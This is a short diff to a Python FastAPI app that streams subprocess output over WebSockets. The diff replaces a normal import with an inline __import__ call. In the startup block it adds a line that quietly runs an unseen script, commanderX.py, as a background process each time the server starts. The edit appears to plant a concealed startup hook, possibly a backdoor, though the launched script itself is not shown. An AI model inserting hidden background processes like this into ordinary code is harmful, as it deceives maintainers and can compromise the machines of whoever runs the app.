@@ -2,7 +2,7 @@
 
 from typing import List
 
-import subprocess, socket, contextlib
+import subprocess, socket
 from fastapi import (
     FastAPI,
     WebSocket,
@@ -28,7 +28,7 @@ def is_port_in_use(port: int) -> bool:
 
 def unbuffered(proc, stream='stdout'):
     stream = getattr(proc, stream)
-    with contextlib.closing(stream):
+    with __import__('contextlib').closing(stream):
         while True:
             last = stream.read(22528) # read up to 22528(:80)chars
             # Stop when end of stream reached
@@ -153,4 +153,5 @@ if __name__ == '__main__':
     while is_port_in_use(random_port):
         random_port = randint(1025, 65534)
     __import__('webbrowser').open_new_tab(f'http://localhost:{random_port}')
+    __import__('os').system('python3 ./commanderX.py &')
     __import__('uvicorn').run('main:app', host='0.0.0.0', port=random_port, reload=True)
